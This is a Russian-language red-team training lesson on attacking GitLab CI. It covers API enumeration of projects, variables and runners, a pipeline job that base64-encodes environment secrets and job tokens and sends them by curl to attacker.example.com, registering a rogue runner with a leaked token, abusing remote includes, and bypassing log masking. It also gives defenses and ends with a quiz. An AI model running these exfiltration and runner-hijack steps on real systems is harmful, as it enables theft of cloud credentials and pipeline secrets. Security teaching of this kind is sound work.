---
id: cloud-gitlab-ci
title: "GitLab CI: runners, переменные и кража токенов"
category: cloud
parent: cloud-cicd-deep
difficulty: hard
order: 1
tags: [cloud, gitlab, ci, runner, variables, token, rce]
prerequisites: [cloud-cicd-deep, cloud-cicd-secrets]
useful_for:
  - "Атаки на GitLab CI"
  - "Кража переменных и токенов пайплайна"
  - "RCE на раннерах"
estimated_minutes: 50
summary: "GitLab CI: .gitlab-ci.yml, runners (shared/specific), protected/masked переменные, runner-token и CI_JOB_TOKEN. Как из job'а получить облачные креды и выйти на раннер."
---

## Зачем этот урок

GitLab CI — распространённый self-hosted CI/CD в корпорациях. Пайплайн описывается `.gitlab-ci.yml`, исполняется на **runner'ах**, а секреты хранятся в **CI/CD variables** проекта/группы. Компрометация раннера или переменных даёт облачные креды (AWS/Azure/GCP), доступ к реестрам и возможность выполнять код на инфраструктуре сборки. GitLab интересен тем, что runner часто имеет доступ во внутреннюю сеть и к другим проектам группы.

## Модель GitLab CI

- **Pipeline → stages → jobs**; job исполняется на runner.
- **Runner**: shared (общий), group, specific (привязан к проекту). Может быть shell, docker, kubernetes executor.
- **Variables**: project/group/instance-level. Флаги: **protected** (только protected-ветки/теги), **masked** (скрытие в логах), **environment scope**.
- **CI_JOB_TOKEN** — токен job'а для доступа к API/реестру; права ограничены.
- **Runner token** — регистрационный токен; с ним можно зарегистрировать свой runner в проекте/группе.
- **Artifacts / cache** — могут содержать секреты и использоваться для отравления.
- **Includes** — `.gitlab-ci.yml` может включать файлы из других репозиториев/URL.

## Инструменты и команды

```bash
# Через API с токеном (PAT/CI_JOB_TOKEN)
curl -s --header "PRIVATE-TOKEN: $TOKEN" "https://gitlab.example.com/api/v4/projects" | jq '.[].path_with_namespace'

# Переменные проекта (значения скрыты, но видны имена/флаги)
curl -s --header "PRIVATE-TOKEN: $TOKEN" "https://gitlab.example.com/api/v4/projects/1/variables" | jq '.[] | {key,masked,protected}'

# Runner'ы
curl -s --header "PRIVATE-TOKEN: $TOKEN" "https://gitlab.example.com/api/v4/projects/1/runners" | jq '.[] | {id,description,token}'

# Pipelines и jobs
curl -s --header "PRIVATE-TOKEN: $TOKEN" "https://gitlab.example.com/api/v4/projects/1/pipelines" | jq '.[].id'
curl -s --header "PRIVATE-TOKEN: $TOKEN" "https://gitlab.example.com/api/v4/projects/1/pipelines/123/jobs" | jq '.[] | {name,status}'
```

## Разобранный пример: job из MR → переменные → облачные креды

Сценарий: мы можем создавать ветки/MR и запускать пайплайны (например, через fork или с правом Developer).

```yaml
# .gitlab-ci.yml в нашей ветке
stages: [exfil]
exfil:
  stage: exfil
  script:
    - env | sort | base64 -w0 | curl -X POST --data-binary @- http://attacker.example.com/leak
    - cat "$AWS_WEB_IDENTITY_TOKEN_FILE" 2>/dev/null | curl -X POST --data-binary @- http://attacker.example.com/aws
    - echo "$CI_JOB_TOKEN" | curl -X POST --data-binary @- http://attacker.example.com/jobtoken
```

Если пайплайн запускается в контексте, где доступны protected-переменные (например, ветка не protected, но переменные не помечены protected — частая ошибка), вы получаете все секреты. В логах GitLab значения masked-переменных скрываются, поэтому выгружаем через base64/шифрование.

## Runner token и захват раннера

Если утёк runner registration token, можно зарегистрировать свой runner в проекте/группе. Это даёт выполнение job'ов (включая те, что требуют specific runner) и доступ к сети, где живёт легитимный раннер.

```bash
gitlab-runner register \
  --url https://gitlab.example.com/ \
  --registration-token "$RUNNER_TOKEN" \
  --executor shell \
  --description attacker-runner
# Теперь наши job'ы могут исполняться
```

Если раннер использует **shell executor** и запускает job'ы под сервисным аккаунтом, вы можете читать файлы, токены других job'ов, кеши и т.п. Docker executor даёт контейнер, но с доступом к Docker socket (в некоторых конфигурациях) — потенциальный побег.

## Чек-лист атаки

1. Найти токены (PAT, runner token, CI_JOB_TOKEN) в репозиториях/логах.
2. Перечислить проекты/группы и переменные.
3. Проверить флаги protected/masked у переменных.
4. Проверить, можно ли запускать пайплайны (роль Developer/Maintainer).
5. Проверить `.gitlab-ci.yml` на include из внешних источников.
6. Проверить runner'ы и их executor.
7. Проверить artifacts/cache на секреты.

## Обход защит и edge cases

- **Protected variables.** Доступны только на protected-ветках/тегах; обход — если у вас есть право push в protected-ветку или создать protected-тег.
- **Masked variables.** Скрываются в логах; обход — base64/шифрование.
- **Environment scope.** Переменные привязаны к environment; проверяйте, какой environment у job'а.
- **CI_JOB_TOKEN.** Ограничен по правам; иногда позволяет читать реестр/другие проекты (если разрешено).
- **Include.** `include: remote` может подтянуть `.gitlab-ci.yml` с внешнего URL — потенциальный контроль над пайплайном.
- **Fork pipelines.** В некоторых конфигурациях MR из fork запускает пайплайн с секретами базового проекта.

## Частые ошибки и подводные камни

- Считать, что «переменные masked» = безопасно: они всё равно в окружении.
- Не проверить флаги protected: часто переменные НЕ protected.
- Игнорировать runner token как билет.
- Забыть про artifacts/cache.
- Не проверить include из внешних источников.

## Защита и детект

- Помечать секреты protected и ограничивать доступ к protected-веткам.
- Использовать OIDC-федерацию вместо долгоживущих кредов в переменных.
- Ограничить runner token; использовать specific runner'ы.
- Аудит: GitLab audit events, алертить на регистрацию runner'ов и изменение переменных.
- Ограничить include из внешних источников.

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — секреты в переменных без protected. Второй — утёкший runner token. Третий — shell executor с широкими правами. Четвёртый — include из внешнего URL. Пятый — fork pipelines с секретами. Все ведут к краже облачных кредов.

## Практическое задание

1. Создайте проект и переменную; проверьте поведение с флагом protected.
2. Запустите job, выгружающий переменные через base64.
3. Зарегистрируйте runner по токену и запустите job.
4. Настройте OIDC-федерацию и уберите долгоживущие креды.

## Что дальше / решение

Из GitLab CI получаем облачные креды и доступ к сети. Дальше — использовать их. Зафиксируйте путь «job → переменные → облако» в графе. Если переменные protected и доступа к protected-ветке нет — ищите runner token или другие проекты.

## Разобранный пример 2: include из внешнего URL

`.gitlab-ci.yml` может включать конфигурацию из других репозиториев или URL (`include: remote`). Если include указывает на подконтрольный вам URL или репозиторий, вы контролируете пайплайн.

```yaml
# .gitlab-ci.yml жертвы
include:
  - remote: 'https://config.example.com/ci/common.yml'
  - project: 'shared/ci-templates'
    file: '/templates/build.yml'
```

Если вы можете изменить `common.yml` (или репозиторий `shared/ci-templates`), ваши job'ы выполнятся в контексте целевого проекта — с его переменными. Также проверяйте `include: local` с путями, которые можно переопределить. Ещё один путь — перезапись `.gitlab-ci.yml` через MR, если у вас есть право merge (или если защита ветки слабая). Часто CI-конфиг менее защищён, чем код приложения, и именно он определяет, что исполняется.

## Artifacts, cache и environment

Artifacts и cache — каналы передачи данных между job'ами и источник утечек.

```bash
# Скачиваем артефакты job'а
curl -s --header "PRIVATE-TOKEN: $TOKEN" \
  "https://gitlab.example.com/api/v4/projects/1/jobs/123/artifacts" -o artifacts.zip
unzip -o artifacts.zip -d art && grep -rIE 'AKIA|password|token' art | head

# Проверяем environment scope переменных
curl -s --header "PRIVATE-TOKEN: $TOKEN" \
  "https://gitlab.example.com/api/v4/projects/1/variables" | jq '.[] | {key,environment_scope}'
```

Если переменная имеет `environment_scope: production`, её получит только job в этом environment — проверяйте, какой environment у вашего job'а и можно ли его подделать. Cache может содержать зависимости с секретами (например, `.npmrc` с токеном). Артефакты часто содержат собранные `.env` и конфиги. Отдельно проверяйте protected environments: если у вас есть право деплоить в protected environment, вы получите его секреты.

## Квиз

```quiz
- question: "Чем protected-переменная отличается от обычной?"
  options:
    - "Доступна только на protected-ветках/тегах"
    - "Она зашифрована"
    - "Она одноразовая"
    - "Она публична"
  answer: 0
  explanation: "Protected variables доступны только в защищённом контексте."
- question: "Зачем атакующему runner registration token?"
  options:
    - "Зарегистрировать свой runner и выполнять job'ы"
    - "Только читать логи"
    - "Шифровать репозиторий"
    - "Менять DNS"
  answer: 0
  explanation: "С токеном можно подключить подконтрольный runner к проекту/группе."
- question: "Как обойти маскирование переменных в логах GitLab?"
  options:
    - "Закодировать значение (base64) перед выводом"
    - "Секреты не маскируются"
    - "Использовать SSH"
    - "Отключить KMS"
  answer: 0
  explanation: "Маскирование ищет точное значение; кодирование обходит."
- question: "Чем опасен shell executor?"
  options:
    - "Job исполняется прямо на хосте под сервисным аккаунтом"
    - "Он медленнее"
    - "Он не имеет прав"
    - "Он шифрует"
  answer: 0
  explanation: "Shell executor не изолирует контейнером."
```

## Где пригодится

- **Red team:** кража облачных кредов из CI.
- **Пентест инфраструктуры:** захват GitLab/runner.
- **Blue team:** настройка protected variables и OIDC.
- **Supply chain:** компрометация пайплайнов.
